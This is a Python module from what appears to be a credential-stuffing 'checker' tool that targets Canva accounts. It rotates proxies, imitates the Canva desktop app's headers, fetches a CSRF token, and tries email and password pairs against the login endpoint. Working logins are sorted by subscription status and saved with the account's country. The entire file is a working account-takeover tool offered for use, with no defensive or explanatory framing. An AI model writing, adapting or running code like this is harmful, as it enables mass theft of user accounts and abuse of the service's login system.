from modules.variables import Checker
from requests import post,get,Session
from modules.functions import log,save,set_proxy,bad_proxy, get_guid
from random import choices

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        guid = get_guid()

        header_1 = {
            "Host": "www.canva.com" ,
            "Connection": "keep-alive" ,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) canvadesktopapp-prod/1.35.0 Chrome/91.0.4472.164 Electron/13.6.1 Safari/537.36 distribution-channel/microsoft-store" ,
            "X-Canva-App": "Login" ,
            "X-Canva-Locale": "es-ES" 
        }
        header_2 = {
            "Content-Type":"application/json" ,
            "Host": "www.canva.com" ,
            "Connection": "keep-alive" ,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) canvadesktopapp-prod/1.35.0 Chrome/91.0.4472.164 Electron/13.6.1 Safari/537.36 distribution-channel/microsoft-store" ,
            "X-Canva-App": "Login" ,
            "X-Canva-Locale": "es-ES" ,
            "X-Csrf-Token": "" 
        }
        header_3 = {
            "Host": "www.canva.com" ,
            "Connection": "keep-alive" ,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) canvadesktopapp-prod/1.35.0 Chrome/91.0.4472.164 Electron/13.6.1 Safari/537.36 distribution-channel/microsoft-store" ,
            "X-Canva-App": "Settings" ,
            "X-Canva-Locale": "es-ES" 
        }
        data = {"A":{"type":"EMAIL_PASSWORD","email":email,"password":password},"C":guid}
        try:
            with Session() as s:
                csrf = s.get("https://www.canva.com/_ajax/csrf3/login2",headers=header_1,timeout=Checker.timeout,proxies=proxy_set).text.split("\"A\":\"")[1].split("\"")[0]
                header_2["X-Csrf-Token"] = csrf

                response = s.post("https://www.canva.com/_ajax/login2",json=data,headers=header_2,timeout=Checker.timeout,proxies=proxy_set)
                if response.status_code == 404 or "\"La contraseña que has escrito es incorrecta.\"" in response.text:
                    retries += 1
                elif "\"id\"" in response.text:
                    country = response.text.split("\"countryCode\":\"")[1].split("\"")[0]
                    brand = response.text.split("\"brands\":{\"")[1].split("\"")[0]
                    
                    capture = s.get(f"https://www.canva.com/_ajax/subscription/subscriptions?principals=%3A{brand}&statuses=TRIALING&statuses=ACTIVE&statuses=PAUSED&statuses=CANCELLED&projections=PRICE&projections=PLAN_DETAILS&projections=SUBSCRIPTION_REPLACEMENT&projections=PRICE_ADJUSTMENT&projections=LIVE_QUANTITY&projections=MANAGEMENT_URL&limit=100",headers=header_3,timeout=Checker.timeout,proxies=proxy_set)
                    if '{"subscriptions":[]}' in capture.text:
                        Checker.custom += 1
                        Checker.cpm += 1
                        if not Checker.cui:
                            log("custom",email+":"+password,"Canva")
                        save("Canva","custom",Checker.time,email+":"+password+f" | Country: {country}")
                        return
                    else:
                        Checker.good += 1
                        Checker.cpm += 1
                        if not Checker.cui:
                            log("good",email+":"+password,"Canva")
                        save("Canva","good",Checker.time,email+":"+password+f" | Country: {country}")
                        return
                else:
                    raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1 
    Checker.cpm += 1
    return